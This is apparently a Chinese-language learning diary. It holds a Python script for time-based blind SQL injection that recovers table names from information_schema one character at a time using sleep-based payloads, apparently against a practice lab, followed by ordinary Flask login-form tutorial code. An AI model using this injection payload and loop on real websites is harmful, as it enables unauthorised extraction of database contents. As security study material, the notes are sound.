@@ -1,0 +1,89 @@
+今天更新了昨天的脚本
+
+#database_name='security'
+table_name=''
+print("Start to injet the name of table:")
+for i in range(1,10):
+    for j in range(97,121):
+        payload=url+"'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1},1,sleep(5)) %23".format(i,j)
+        try:
+            print(payload)
+            r=requests.get(payload,timeout=5)
+            table_name += chr(j)
+            print("table name is:" + table_name)
+            break
+        except Exception as e:
+            print("现在查询到："+chr(j)+" ! " + str(e))
+            
+昨天一直困扰的问题是查询表名使用了group_concat()返回的是一串字符串，在之后查询字段的时候没办法自动的分割各个表名，去问了学长，
+如果是全部自动化的类似于sqlmap，代码就太复杂了，目前做的是一段代码实现爆库，接下来一段代码爆表，这样一段代码得到的结果进行手动分割，再继续下一次操作。
+
+昨天考虑的limit问题也是进行手动改，依次获得各个目标字符串。
+
+这次增加了错误信息的抛出，加上str(e)打印超时信息，第一次直接打印e，报错TypeError: can only concatenate str (not "ReadTimeout") to str。
+
+又完善了flask的第三章表单的内容。
+增加了登陆提交信息的功能。
+
+login.html
+
+{% extends "base.html" %}
+
+{% block content %}
+	<h1>Sign In</h1>
+	<form action="" method="post" novalidate>
+		{{ form.hidden_tag() }}
+
+		<p>
+			{{ form.username.label }}<br>
+			{{ form.username(size=32) }}<br>
+			{% for error in form.username.errors %}
+			<span style="color: red;">[{{ error }}]</span>
+			{% endfor %}
+		</p>
+		<p>
+			{{ form.password.label }}<br>
+			{{ form.password(size=32) }}<br>
+			{% for error in form.password.errors %}
+			<span style="color: red;">[{{ error }}]</span>
+			{% endfor %}
+		</p>
+		<p>{{ form.remember_me() }} {{ form.remember_me.label }}</p>
+		<p>{{ form.submit() }}</p>
+	</form>
+{% endblock %}
+
+继承了base模板，还要通过视图函数进行渲染
+
+from flask  import render_template, flash,redirect
+from app import app  
+from app.forms import LoginForm
+
+@app.route('/')
+
+
+@app.route('/index')
+def index():
+    user = {'username':'Brain'}
+    posts = [
+	{
+	    'author':{'username':'John'},
+	    'body':'Beautiful day in Portland!'
+	},
+	{
+	    'author':{'username':'Susan'},
+	    'body':'The Avengers movie was so cool!'
+	}
+    ]
+    return render_template('index.html', title='Home',user=user,posts=posts) 
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+	form = LoginForm()
+	if form.validate_on_submit():
+		flash('Login requested for user {}, remember_me={} '.format(form.username.data , form.remember_me.data))
+		return redirect(url_for('index'))
+	return render_template('login.html', title='Sign In', form=form)
+  
+ 
+ 
